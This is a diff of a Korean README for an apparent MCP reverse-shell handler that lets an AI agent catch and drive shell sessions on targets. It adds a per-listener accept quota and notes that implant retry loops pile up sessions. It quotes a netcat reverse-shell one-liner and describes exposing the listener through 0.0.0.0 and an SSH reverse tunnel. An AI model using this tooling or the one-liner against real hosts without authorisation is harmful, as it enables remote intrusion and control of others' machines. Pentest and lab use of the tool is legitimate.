@@ -127,8 +127,9 @@ cat /tmp/f | sh -i 2>&1 | nc 127.0.0.1 31338 > /tmp/f
 
 ```
 session_list()
-→ {"sessions": [{"id": "sess_f97f", "peer": "127.0.0.1:40498",
-                 "state": "active", "busy": false, ...}]}
+→ {"listener": null,                        // 1개 받고 자동으로 닫힘
+   "sessions": [{"id": "sess_f97f", "peer": "127.0.0.1:40498",
+                 "state": "active", "has_pty": true, ...}]}
 
 session_exec(session_id="sess_f97f", cmd="id")
 → {"output": "uid=1000(irev) gid=1000(irev) groups=...",
@@ -140,9 +141,9 @@ session_exec(session_id="sess_f97f", cmd="id")
 
 | 툴 | 상한 | 역할 |
 |---|---|---|
-| `listener_start(port, host="127.0.0.1")` | 즉시 | 리스너 시작. 접속을 기다리지 않음 |
+| `listener_start(port, host="127.0.0.1", accept=1)` | 즉시 | 리스너 시작. 기본 1세션만 받고 자동 중단 |
 | `listener_stop()` | 즉시 | 포트 반납. 기존 세션은 유지 |
-| `session_list()` | 즉시 | 세션 요약 목록 |
+| `session_list()` | 즉시 | 리스너 상태 + 세션 요약 |
 | `session_read(session_id, since=0, wait_ms=0, max_bytes=65536)` | `wait_ms` | 원시 스트림 증분 조회 |
 | `session_write(session_id, data, newline=true, confirm=false)` | 즉시 | 원시 전송. 완료 감지 없음 |
 | `session_close(session_id)` | 즉시 | 연결 끊기. 버퍼는 유지 |
@@ -151,15 +152,29 @@ session_exec(session_id="sess_f97f", cmd="id")
 <details>
 <summary>파라미터 · 반환값 상세</summary>
 
-### `listener_start(port, host)`
+### `listener_start(port, host, accept)`
 
-접속 확인은 `session_list` 폴링으로 합니다. 같은 포트로 재호출하면 기존 ID를 반환(멱등), 다른 포트는 거부됩니다. 포트를 옮기려면 `listener_stop()`을 먼저 호출하세요.
+접속 확인은 `session_list` 폴링으로 합니다. 포트를 옮기려면 `listener_stop()`을 먼저 호출하세요.
+
+`accept`만큼 세션을 받으면 **리스너가 스스로 닫힙니다**(기본 1). `accept=0`이면 무제한입니다.
+
+같은 포트·host로 재호출하면 **쿼터가 누적**됩니다 — 멱등이 아닙니다. 3번 부르면 3개를 받습니다. host나 port가 다르면 거부되고 쿼터도 오르지 않습니다.
+
+```
+listener_start(31338)              → accept_remaining: 1
+listener_start(31338, accept=2)    → accept_remaining: 3   (누적)
+listener_start(31338, "0.0.0.0")   → error (bind address 변경은 listener_stop 먼저)
+```
 
 ### `listener_stop()`
 
 리스닝 소켓만 닫고 포트를 반납합니다. 이미 붙어 있는 세션은 건드리지 않습니다.
 
 ### `session_list()`
+
+반환은 `{"listener": {...} | null, "sessions": [...]}` 형태입니다. `listener`가 `null`이면 리스너가 없는 것 — 시작한 적이 없거나, 중단했거나, **수락 쿼터를 채워 스스로 닫힌** 상태입니다. `accept_remaining`은 앞으로 몇 개를 더 받을지이며 `null`은 무제한입니다.
+
+세션 각 행의 필드:
 
 | 필드 | 의미 |
 |---|---|
@@ -270,9 +285,23 @@ rm -rf /tmp/build                      # 루트가 아니므로 통과
 
 여러 줄이 필요하면 `session_write`를 쓰세요.
 
+### 리스너는 기본적으로 1개만 받고 닫힙니다
+
+임플란트는 대개 재시도 루프를 돕니다. 무제한 리스너를 30초 주기 루프 앞에 두면 **30초마다 세션이 하나씩 쌓여** `--max-sessions`를 포화시킵니다. 그래서 `accept` 기본값이 1입니다.
+
+```
+listener_start(31338)            # 1개 받고 닫힘
+listener_start(31338, accept=3)  # 3개 받고 닫힘
+listener_start(31338, accept=0)  # 무제한 — listener_stop 으로 직접 닫아야 함
+```
+
+닫혔는지는 `session_list()`의 `listener` 필드로 확인합니다(`null`이면 닫힘).
+
+주의: 리스너를 열어둔 채 사람이 메시지를 주고받는 동안에도 세션은 계속 붙습니다. 재시도 주기가 짧은 타겟이면 **대화 왕복 한 번에 한두 개가 더 생깁니다.**
+
 ### 포트 1개 = 세션 1개가 아닙니다
 
-리스너 하나로 여러 타겟을 동시에 받습니다(`--max-sessions` 상한까지). 타겟마다 포트를 나눌 필요가 없습니다.
+리스너 하나로 여러 타겟을 받습니다. 타겟마다 포트를 나눌 필요가 없습니다. 다만 **`accept` 쿼터가 먼저 걸리므로**, 타겟 4대를 받으려면 `accept=4`(또는 `accept=0`)를 주어야 합니다.
 
 ### 세션이 엉켰을 때 — PTY 유무에 따라 다릅니다
 
@@ -342,7 +371,7 @@ listener_start(31338, host="0.0.0.0")    # ② 툴 호출
 
 MCP 서버는 클라이언트의 자식 프로세스로 실행되므로, 타겟이 인터넷 너머에서 콜백한다면 리스너가 도는 위치를 먼저 정해야 합니다.
 
-**SSH 역터널 (권장)** — 리스너는 루프백에 두고 공인 서버가 트래픽을 넘겨줍니다.
+**SSH 역터널 (권장)** — 리스너는 루프백에 두고 공인 서버가 트래픽을 넘겨줍니다. 단계별 설정과 문제 해결은 **[TUNNEL.md](TUNNEL.md)** 를 보세요.
 
 ```bash
 ssh -R 0.0.0.0:31338:localhost:31338 user@public-server -N
